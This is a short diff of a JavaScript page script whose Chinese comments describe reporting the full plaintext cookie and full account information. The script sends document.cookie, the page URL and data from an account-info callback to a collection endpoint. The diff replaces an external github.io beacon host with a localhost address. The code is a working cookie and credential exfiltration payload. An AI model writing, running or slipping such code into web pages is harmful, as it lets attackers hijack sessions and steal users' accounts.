@@ -20,7 +20,7 @@ function send(path, params) {
 }
 
 // 上报：明文 Cookie
-send('https://allen10086.github.io/collect.gif', {
+send('http://127.0.0.1:18000/collect', {
   stage: 'page_loaded',
   cookie: summarizeCookie(document.cookie), // 👈 完整明文Cookie
   href: location.href,
@@ -30,7 +30,7 @@ send('https://allen10086.github.io/collect.gif', {
 // 回调：直接上报完整账号信息（明文）
 window.cb_account = function (v) {
   var s = typeof v === 'string' ? v : JSON.stringify(v);
-  send('https://allen10086.github.io/collect.gif', {
+  send('http://127.0.0.1:18000/collect', {
     stage: 'getAccountInfo',
     data: s, // 👈 完整账号信息（明文）
     len: s.length
